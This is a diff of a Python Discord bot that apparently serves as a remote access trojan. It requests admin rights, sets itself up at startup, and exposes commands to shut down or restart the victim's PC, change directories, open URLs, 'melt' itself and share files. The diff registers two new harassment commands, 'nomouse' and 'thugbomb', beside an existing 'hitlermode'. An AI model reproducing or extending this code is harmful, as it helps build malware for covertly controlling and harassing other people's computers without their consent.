@@ -11,7 +11,7 @@ from command.filecommands.advancedshare_command import advanced_share_command
 startuplogic.askadmin.setup()
 startuplogic.addme.run_setup_in_thread()
 from command.useful import search_command, setvol_command, cd_command, openurl_command, restartpc_command, shutdownpc_command
-from command.troll import hitlermode_command
+from command.troll import hitlermode_command, nomouse_command, thugbomb_command
 
 
 intents = discord.Intents.all()
@@ -71,4 +71,6 @@ bot.add_command(commands.Command(melt_command.melt_command, name='melt'))
 bot.add_command(commands.Command(advanced_share_command, name='linkshare'))
 bot.add_command(commands.Command(help_command.help_command, name='help'))
 bot.add_command(commands.Command(hitlermode_command.hitler_command, name='hitlermode'))
+bot.add_command(commands.Command(nomouse_command.nomouse_command, name='nomouse'))
+bot.add_command(commands.Command(thugbomb_command.thugbomb_command, name='thugbomb'))
 bot.run(discodd.TOKEN)
